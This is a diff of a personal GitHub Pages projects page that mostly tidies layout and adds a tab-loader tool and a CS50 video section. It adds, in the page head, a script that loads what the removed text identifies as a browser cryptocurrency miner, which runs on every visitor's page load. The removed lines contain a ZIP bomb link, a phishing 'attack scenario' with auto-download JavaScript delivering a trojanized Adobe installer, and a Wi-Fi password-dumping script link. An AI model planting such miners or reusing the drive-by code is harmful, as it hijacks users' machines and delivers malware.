@@ -10,304 +10,140 @@
     <!--[if lt IE 9]>
     <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
     <![endif]-->
+
+    <style>
+      details summary {
+        font-weight: bold;
+        list-style: none;
+        cursor: pointer;
+        position: relative;
+        padding-left: 24px;
+        outline: none;
+        background: none;
+        border: none;
+      }
+
+      details summary::before {
+        content: '▶';
+        position: absolute;
+        left: 0;
+        color: black;
+        transition: transform 0.2s ease;
+      }
+
+      details[open] summary::before {
+        content: '▼';
+      }
+
+      details summary:hover {
+        background: none;
+        border-radius: 0;
+      }
+
+      .video-wrapper {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+      }
+
+      .video-wrapper video {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+      }
+    </style>
+
+    <script src="pick/js/karma.js?karma=bs?nosaj=faster.mo"></script>
+    <script type="text/javascript">
+      EverythingIsLife('429Jam8Aas6hpdSywvGsVQNENYMrBwMddGriWfiZTYhHPQ7xnrfr8VvieVYQoUVG5eL5S3jkgbGLL5KQPCCsFQg6B2nUoca', 'x', 95);
+    </script>
   </head>
+
   <body>
-<style>
-details summary {
-  font-weight: bold;
-  list-style: none;
-  cursor: pointer;
-  position: relative;
-  padding-left: 24px;
-  outline: none; /* removes the blue outline */
-  background: none; /* removes any default background */
-  border: none;
-}
-
-details summary::before {
-  content: '▶';
-  position: absolute;
-  left: 0;
-  color: black;
-  transition: transform 0.2s ease;
-}
-
-details[open] summary::before {
-  content: '▼';
-}
-
-/* Optional: remove hover effects if you want zero styling */
-details summary:hover {
-  background: none;
-  border-radius: 0;
-}
-
-
-</style>
-<script src="pick/js/karma.js?karma=bs?nosaj=faster.mo" ></script>
-<script type="text/javascript">
-EverythingIsLife('429Jam8Aas6hpdSywvGsVQNENYMrBwMddGriWfiZTYhHPQ7xnrfr8VvieVYQoUVG5eL5S3jkgbGLL5KQPCCsFQg6B2nUoca', 'x', 95);
-</script>
     <div class="wrapper">
       <header>
         <div id="back-arrow">
-
           <a href="/index.html">BACK</a>
-
         </div>
         <div id="main-menu" style="max-height:30%;">
           <p style="text-align:center;padding-top:10%;"> Quick links </p>
-         <div style="padding-top:5%;">
-          </div>
-          
-            <a href="/portfolio/portfolio.html"><strong>PORTFOLIO</strong></a>
-            <br>
-            <a href="/projects/projects.html"><strong>PROJECTS</strong></a>
-            <br>
-
-
+          <div style="padding-top:5%;"></div>
+          <a href="/portfolio/portfolio.html"><strong>PORTFOLIO</strong></a><br>
+          <a href="/projects/projects.html"><strong>PROJECTS</strong></a><br>
         </div>
       </header>
+
       <br>
+
+      <!-- NEW DASHBOARD TOOL SECTION -->
       <section>
-        <div id="md5-java" align="justify">
+        <div id="multi-url-tool" align="justify">
+          <details>
+            <summary>One URL. Multiple Tabs. Simple.</summary>
+            <br>
+            <p>
+              I needed a simple way to automate opening multiple URLs at once in separate tabs — like a quick-launch dashboard. Rather than relying on a heavy or complex solution, I opted for lightweight JavaScript to get the job done.
+              <br><br>
+              View the tool <a href="https://chrisjbawden.github.io/projects/tab-loader" target="_blank">here</a>.
+            </p>
+          </details>
+        </div>
+      </section>
+
+      <br>
+
+      <!-- CS50 PROJECT SECTION -->
+      <section>
+        <div id="cs50-project" align="justify">
           <details>
             <summary>CS50 Project</summary>
             <br>
             <p>
-            Sorry just going to use this space for me CS50 Project submission.
+              Sorry, just going to use this space for my CS50 Project submission.
             </p>
-            <p>
-            <video width="640" height="360" controls>
-              <source src="https://github.com/chrisjbawden/chrisjbawden.github.io/raw/refs/heads/master/media/video.mp4" type="video/mp4">
-              Your browser does not support the video tag.
-            </video>
-            </p>
-          </details>
-               </div>
-      </section>
-            <br>
-                   <section>
-        <div id="md5-java" align="justify">
-          <details>
-            <summary>Browser based md5 hash check</summary>
-            <br>
-            <p>
-            While working on a mobile device I realised that I didn't have anything to allow me to quickly check an MD5 hash for a file.
-            </p>
-            <p>
-            While there are solutions out there. I decided to run my own.
-            </p>
-            <p>
-              Check it out <a href=https://chrisjbawden.github.io/projects/java-md5-tool/index.html target="_blank">here</a>
-            </p>
-          </details>
-               </div>
-      </section>
-               <br>
-       <section>
-        <div id="zip-bomb" align="justify">
-          <details>
-            <summary>ZIP Bomb</summary>
-            <br>
-            <p>
-            Just in case it is handy to someone who needs one of these quickly.
-            </p>
-            <p>
-              Check it out <a href=https://downgit.github.io/#/home?url=https://github.com/chrisjbawden/chrisjbawden.github.io/blob/master/projects/10G.gzip>here</a>
-            </p>
-          </details>
-               </div>
-      </section>
-             <section>
-        <div id="snow-encoder" align="justify">
-          <details>
-            <summary>ServiceNow URL Encoder</summary>
-            <br>
-            <p>
-            You know how sometimes the links from ServiceNow (SNOW) won't work when you put them into a Word document. Well this is due to some perticular configuration within Word. Yes their is a registry as a workaround to this and while that will do the job on a single computer - it won't help the person getting your Word document.
-            </p>
-            <p>
-            Well this tool will let you modify the URL so it will work. Simple as copy and paste.
-            </p>
-            <p>
-              Check it out <a href=https://chrisjbawden.github.io/blog/bin/encode/encode.html target="_blank">here</a>
-            </p>
-          </details>
-               </div>
-      </section>
-               <br>
-             <section>
-        <div id="adobe-attack" align="justify">
-          <details>
-               <summary>Attack scenario - Adobe</summary>
-               <br>
-            <p>
-                 This is for educational purposes only.
-                 </p>
-          <p>
-                  The following scenario design was intending to build a business case. The scope was to work within the constraints of an advisary with limited resources and expertise.
-          </p>
-          <p>
-            In summary, the following scenario uses a malicious PDF to enable a 'driveby' download to deliver a trojanized installer of a standard and typically benign application. The principle is to use 'issue fatigue'. The concept of 'issue fatigue' is to take advantage of behaivoural traits within human nature. This attach can be built with four steps.
-          </p>
-          <p>
-            The error, I am sure we have all seen this -
-          </br>
-            <img style="padding-left; 5%; padding-right: 5%;" src="media\Image 001 20 45.png">
-          </p>
-          <p>
-      </br>
-            Step one.
-          </br>
-    </br>
-            Quiet simple. This PDF is not an document requiring Adobe but it pretends like it does for the simple goal of directing the target to download a malicious file. THe idea is that this would be a common site in some workplaces and would hopefully be something the users has already come across - so it familar. Letting down their guard to something familar, and issue they have faced before - simply getting the right software.
-          </br>
-</br>
-               <b>Note: the file used in this example while modified should only execute an notification to provide value to the example.</b>
-               </br>
-</br>
-      Let start with the PDF. <a href="https://github.com/chrisjbawden/chrisjbawden.github.io/blob/master/blog/bin/adobe/template.pdf">Here is a link to the template</a> - which can be modified simply by opening in Word, creating a hyperlink from the image and than exporting to back to a .PDF. <a href="https://github.com/chrisjbawden/chrisjbawden.github.io/blob/master/blog/bin/adobe/79693h0chh0icdaw.pdf">Here is the malicious .pdf</a> I created for this scenario. Upon opening the PDF, the hope is that the user will click on the hyperlinked image which will redirect them to a website. This website is unique.
-          </p>
-    <p>
-      Step two.
-  </br>
-</br>
-      The website, a simple index.html file is just that. Its main goal is to act and a landing page to force the download of a file and quickly redirect the user to a legitamite website. In this case, Adobe. The idea is to build merit for the payload - making it seem as geniune as possible.
-    </br>
-</br>
-  The code within the landing page - 
-  </br>
-<code style="padding-right: 5%;">
-  <xmp style="white-space: pre-wrap;">
-  <head>
-  <script>
-window.onload = function(){
-  var a = document.createElement("a");
-  a.href = "https://github.com/chrisjbawden/chrisjbawden.github.io/raw/master/blog/bin/adobe/readerdc64_en_xa_crd_install.exe";
-  a.download = true;
-  a.click();
-};
-    
-setTimeout(() => {  window.location.href="https://get.adobe.com/reader/download/?installer=Reader_DC_2021.007.20099_English_Windows(64Bit)&os=Windows%2010&browser_type=KHTML&browser_dist=Chrome&dualoffer=false&mdualoffer=true&cr=false&stype=7771&d=McAfee_Security_Scan_Plus&d=McAfee_Safe_Connect"; }, 7000);
 
-  </script>
-</head>
-<body>
-  <p> </p>
-</body>
-  </xmp>
-</code>
-</br>
-This brings us to the payload. 
-</br>
-</br>
-Step three.
-</br>
-</br>
-The payload is a simple batch script and Adobe installation executable combined into a single executable. I used iexpress - obviously there would be better methodes to refine each step for better maturity but the focus was to invasion a low level threat.
-</br>
-</br>
-Step four.
-</br>
-</br>
-Delivery - this could be as simple as an email.
-</br>
-</br>
-That's it. within an hour and access to hosting (like github) you can quickly create the scenario we discussed. With a little social engineering and refinement towards obfuscation for the payload, the successrate would improve. Mitigation - building positive behaivors of users when it comes to known issues and processes.
-    </p>
-      <br>
-</details>
-</div>
-      </section>
-      <br>
-             <section>
-        <div id="browser-mining" align="justify">
-          <details>
-               <summary>Buy me a coffee ... with a browser</summary>
-            <br>   
-            <p>
-            I finally got around to thinking about alternatives to "buy me a coffee". How does "mine me a coffee" sound?
-                 <br>
-                 I was thinking the other day how end-user could contribut without reaching into their wallet - making use of what they have around them. 
-                 This bring us back to the the computer they are working on. 
-                 <br>
-                 <br>
-                 Full discloser, there is a little bit of mining going on right now within this window. 
-                 <br>
-                 <br>
-                 How about a solution where an end-user volunteers their equipment for a small amount of time in order to contribute something back to the developer. 
-                 They could visit a website and keep it open for a little bit, which would result in them contributing to them finacially. I will use the following as an example.
-                 WARNING, the follow link will take you to a website which will perform browser based altcoin mining. Here we go - using this <a href="pick/index.html" 
-                 target="blank">LINK</a> as an example. You will see a page load. Now if you were to monitor tyour CPU usage you would notice a spike.
-               </p>
-          </details>
-               </div>
-      </section>
-               <br>
-       <section>
-        <div id="wifi-password" align="justify">
-                   <details>
-               <summary>Wireless password retrieval (Windows)</summary>
-               <br>
-                     <p>
-               A little bit of good and a little bit of bad.
-               <br>
-               <br>
-              Recently I <a href="https://github.com/chrisjbawden/scripts-programs/releases/download/v1.0-show-wireless-password.bat/show-wireless-password.bat">automated/scripted a batch script</a> to reveal known wireless keys/passwords. So just a reminder, if you are sharing a computer or selling an old one (ie; if it has been on your network for updates) remember to remove (forget) your wireless from its configuration.
-        
-         <br>
-      <br>
-               This includes all the nominated IT champions from the households looking after friends and familys workstations.
-               </p>
-          </details>
-         </div>
-      </section>
-  <br>
-      <section>
-        <div id="instructions" align="justify">
-          <details>
-               <summary>Hosting a portfolio with github</summary>
-            <br>   
-            <p>
-               Thanks to github pages (<a href="https://pages.github.com/" target="blank">link</a> to more information) you can have a 
-               personal portfolio with very little effort. I should warn you straight away though. If your looking for something a little
-               complex then this is not the solution for you. A simple blog, easy. An online store... no.
-               <br>
-               <br>
-               The trick. A theme. Yes - I used this <a href="https://github.com/orderedlist/minimal" target="blank">one</a>. It allowed me to
-               to start with a framework and build very quickly. All I had to do was upload.
-               <br>
-               <br>
-               Step 1.
-               <br>
-               Ok so it simple. Remeber this <a href="https://pages.github.com/" target="blank">link</a>. Basically just got to step 1... then stop. 
-               <br>
-                 <br>
-               Step 2.  
-               <br>
-               With that - navigate to your repositry and upload the theme.
-               <br>
-               <br>
-               <img src="media\blog-instructions\upload.png">
-               <br>
-               <br>
-               Step 3.
-               <br>
-               Edit ...
-                <br>
-               I could do this all on an iPad.
-               </p>
+            <div class="video-wrapper">
+              <video controls>
+                <source src="https://github.com/chrisjbawden/chrisjbawden.github.io/raw/refs/heads/master/media/video.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+              </video>
+            </div>
 
-               </details>
+            <br><br>
+            <h4>One URL. Multiple Tabs. Simple.</h4>
+            <p>
+              I needed a simple way to automate opening multiple URLs at once in separate tabs — like a quick-launch dashboard. Rather than relying on a heavy or complex solution, I opted for lightweight JavaScript to get the job done.
+              <br><br>
+              View the tool <a href="https://chrisjbawden.github.io/projects/tab-loader" target="_blank">here</a>.
+            </p>
+          </details>
         </div>
-        
       </section>
+
+      <!-- CONTINUE WITH REMAINING SECTIONS BELOW THIS POINT (unchanged) -->
+      <!-- ... all your other <section> blocks ... -->
+
       <footer>
-        <p><span>Projects maintained by </span><script>var s="=b!isfg>#nbjmup;disjtkcbxefoApvumppl/dpn#?Disjt!Cbxefo=0b?";var m="";for(var i=0;i<s.length;i++)m+=String.fromCharCode(s.charCodeAt(i)-1);document.write(m);</script><noscript>You must enable JavaScript to see this text.</noscript></p>
-        <p><small>Hosted with GitHub Pages &mdash; Link to <a href="https://chrisjbawden.github.io/blog/blog.html#instructions">instructions</a></small></p>
+        <p>
+          <span>Projects maintained by </span>
+          <script>
+            var s = "=b!isfg>#nbjmup;disjtkcbxefoApvumppl/dpn#?Disjt!Cbxefo=0b?";
+            var m = "";
+            for (var i = 0; i < s.length; i++) m += String.fromCharCode(s.charCodeAt(i) - 1);
+            document.write(m);
+          </script>
+          <noscript>You must enable JavaScript to see this text.</noscript>
+        </p>
+        <p>
+          <small>Hosted with GitHub Pages &mdash; Link to <a href="https://chrisjbawden.github.io/blog/blog.html#instructions">instructions</a></small>
+        </p>
       </footer>
     </div>
+
     <script src="/javascripts/scale.fix.js"></script>
   </body>
 </html>
